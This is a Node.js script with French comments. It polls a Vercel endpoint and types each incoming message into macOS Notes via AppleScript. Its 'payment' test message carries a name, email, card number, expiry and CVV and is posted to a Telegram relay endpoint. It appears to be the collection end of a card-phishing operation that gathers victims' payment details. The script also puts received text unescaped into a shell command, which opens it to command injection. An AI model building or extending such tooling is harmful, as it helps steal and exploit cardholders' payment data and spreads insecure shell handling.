const { exec } = require('child_process');
const fetch = require('node-fetch');

console.log('📝 SCRIPT DE COLLAGE AUTOMATIQUE DANS NOTES');
console.log('==========================================');

const CONFIG = {
    VERCEL_API_URL: 'https://test-alpha-lac-68.vercel.app/api/notifications',
    TELEGRAM_API_URL: 'https://test-alpha-lac-68.vercel.app/api/telegram',
    CHECK_INTERVAL: 5000, // 5 secondes
    NOTES_APP_NAME: 'Notes'
};

let lastMessageId = 0;

// Fonction pour récupérer les messages depuis Vercel
async function getMessages() {
    try {
        console.log('🔍 Vérification des messages...');
        const response = await fetch(CONFIG.VERCEL_API_URL);
        const data = await response.json();
        
        if (data.success && data.notifications && data.notifications.length > 0) {
            console.log(`📨 ${data.notifications.length} notifications trouvées`);
            return data.notifications.reverse(); // Plus récents en premier
        }
        return [];
    } catch (error) {
        console.error('❌ Erreur récupération messages:', error);
        return [];
    }
}

// Fonction pour ouvrir Notes et coller le texte
function pasteToNotes(text) {
    return new Promise((resolve, reject) => {
        console.log('📝 Ouverture de Notes et collage du message...');
        
        // Script AppleScript pour ouvrir Notes et coller
        const appleScript = `
tell application "Notes"
    activate
    delay 1
    tell application "System Events"
        keystroke "\\n\\n=== NOUVEAU MESSAGE CACAPAYBOT ===\\n"
        keystroke "${text.replace(/"/g, '\\"').replace(/\n/g, '\\n')}"
        keystroke "\\n\\n=== FIN DU MESSAGE ===\\n\\n"
    end tell
end tell
`;

        exec(`osascript -e '${appleScript}'`, (error, stdout, stderr) => {
            if (error) {
                console.error('❌ Erreur AppleScript:', error);
                reject(error);
            } else {
                console.log('✅ Message collé dans Notes avec succès !');
                resolve(stdout);
            }
        });
    });
}

// Fonction pour créer un message de test
async function createTestMessage() {
    try {
        console.log('🧪 Création d\'un message de test...');
        
        const testMessage = `💰 MESSAGE DE TEST AUTOMATIQUE !
👤 Nom: Test Auto
📧 Email: test@auto.com
💳 Carte: 1234 **** **** 5678
📅 Expiration: 12/25
🔐 CVV: 123
💶 Montant: 99.99€
🔒 Vérifiez immédiatement !`;

        const response = await fetch(CONFIG.TELEGRAM_API_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: testMessage,
                type: 'payment'
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('✅ Message de test envoyé !');
            return testMessage;
        }
        
        return null;
    } catch (error) {
        console.error('❌ Erreur création message test:', error);
        return null;
    }
}

// Fonction principale de surveillance
async function monitorMessages() {
    try {
        const messages = await getMessages();
        
        if (messages.length > 0) {
            const latestMessage = messages[0];
            
            // Vérifier si c'est un nouveau message
            if (latestMessage.id !== lastMessageId) {
                console.log(`🆕 Nouveau message détecté (ID: ${latestMessage.id})`);
                console.log(`📄 Contenu: ${latestMessage.message.substring(0, 100)}...`);
                
                // Coller dans Notes
                await pasteToNotes(latestMessage.message);
                
                // Mettre à jour l'ID du dernier message
                lastMessageId = latestMessage.id;
                
                console.log('✅ Message traité avec succès !');
            } else {
                console.log('📭 Aucun nouveau message');
            }
        } else {
            console.log('📭 Aucun message trouvé');
        }
    } catch (error) {
        console.error('❌ Erreur surveillance:', error);
    }
}

// Fonction pour tester le système
async function testSystem() {
    console.log('🧪 Test du système de collage...');
    
    const testMessage = await createTestMessage();
    if (testMessage) {
        console.log('⏳ Attente de 3 secondes pour que le message soit traité...');
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        console.log('📝 Collage du message de test dans Notes...');
        await pasteToNotes(testMessage);
    }
}

// Gestion des arguments de ligne de commande
const args = process.argv.slice(2);

if (args.includes('--test')) {
    // Mode test
    testSystem().then(() => {
        console.log('✅ Test terminé !');
        process.exit(0);
    });
} else if (args.includes('--once')) {
    // Mode une seule fois
    monitorMessages().then(() => {
        console.log('✅ Vérification terminée !');
        process.exit(0);
    });
} else {
    // Mode surveillance continue
    console.log('🔄 Démarrage de la surveillance continue...');
    console.log('💡 Appuyez sur Ctrl+C pour arrêter');
    console.log('📝 Les messages seront automatiquement collés dans Notes');
    console.log('');
    
    // Vérification initiale
    monitorMessages();
    
    // Surveillance continue
    setInterval(monitorMessages, CONFIG.CHECK_INTERVAL);
}

// Gestion de l'arrêt propre
process.on('SIGINT', () => {
    console.log('\n🛑 Arrêt de la surveillance...');
    process.exit(0);
});
